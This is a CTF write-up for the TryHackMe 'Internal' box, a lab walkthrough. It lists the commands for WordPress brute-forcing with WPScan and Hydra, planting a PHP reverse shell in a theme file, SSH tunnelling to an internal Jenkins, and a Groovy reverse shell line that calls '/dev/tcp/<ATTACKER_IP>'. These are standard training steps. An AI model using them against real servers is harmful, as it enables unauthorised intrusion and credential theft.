# Internal

**Platform:** TryHackMe
**OS:** Linux
**Tags:** WordPress, WPScan, Jenkins, SSH Tunnel, Hydra, Docker, Groovy
**Date:** 2026-05-04

wpscan brute-forces the WordPress XML-RPC endpoint for admin access; a PHP shell gets www-data and SSH credentials in /opt give aubreanna. An SSH tunnel to internal Jenkins, Groovy console RCE, and plaintext root credentials in a container give host root.

## 1. Enumeration

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Findings:
- 22/tcp - OpenSSH 7.6p1 Ubuntu
- 80/tcp - Apache httpd 2.4.29 (Ubuntu)

Ran Gobuster to discover directories on port 80.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

Findings:
- /blog - Status 301, WordPress install
- /phpmyadmin - Status 301, Database admin panel
- /wordpress - Status 301, WordPress files

## 2. WordPress Enumeration

Ran WPScan against the WordPress instance at `/blog/` to enumerate users and check for vulnerabilities.

```bash
wpscan --url http://internal.thm/blog/ --enumerate u
```

Findings:
- Version: WordPress 5.4.2, outdated
- XML-RPC: Enabled, allows brute-forcing via xmlrpc.php
- User: admin, found via user enumeration

Brute-forced the WordPress login via XML-RPC using rockyou.txt.

```bash
wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt
```

**WordPress admin credentials found.**

## 3. Initial Foothold

Logged into the WordPress admin panel. Navigated to **Appearance - Theme Editor - 404.php (Twenty Seventeen)** and replaced the content with a PHP reverse shell.

```bash
nc -lvnp 4444
```

Triggered the shell by visiting a non-existent WordPress page:

```
http://internal.thm/blog/?p=9999
```

**Shell caught as www-data.**

Stabilised the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 4. Lateral Movement: www-data to aubreanna

Checked `/opt` for interesting files. Found a note containing SSH credentials for the user `aubreanna`.

```bash
cat /opt/wp-save.txt
```

**SSH credentials for aubreanna found in plaintext.**

```bash
ssh aubreanna@internal.thm
```

Retrieved the user flag. Also found `jenkins.txt` revealing an internal Jenkins service running on `172.17.0.2:8080` inside a Docker container.

## 5. Jenkins Exploitation via SSH Tunnel

Jenkins was only accessible internally. Set up an SSH local port forward to expose it on the attack machine.

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

Accessed Jenkins at `http://127.0.0.1:8080` in the browser. Brute-forced the login with Hydra.

```bash
hydra -s 8080 -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 \
  http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

**Jenkins admin credentials cracked.**

Logged in. Navigated to **Manage Jenkins - Script Console** and executed a Groovy reverse shell.

```groovy
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"].execute()
```

**Shell caught as jenkins inside Docker container.**

## 6. Root

Inside the Jenkins Docker container, checked `/opt` again - found a note with root SSH credentials for the host machine.

```bash
ssh root@172.17.0.1
```

**Root access on the host machine. Retrieved root flag.**

Key Takeaway: Always check `/opt` on every user you pivot to. This box hid credentials there twice. SSH tunnelling to reach internal services is an essential skill for real engagements.
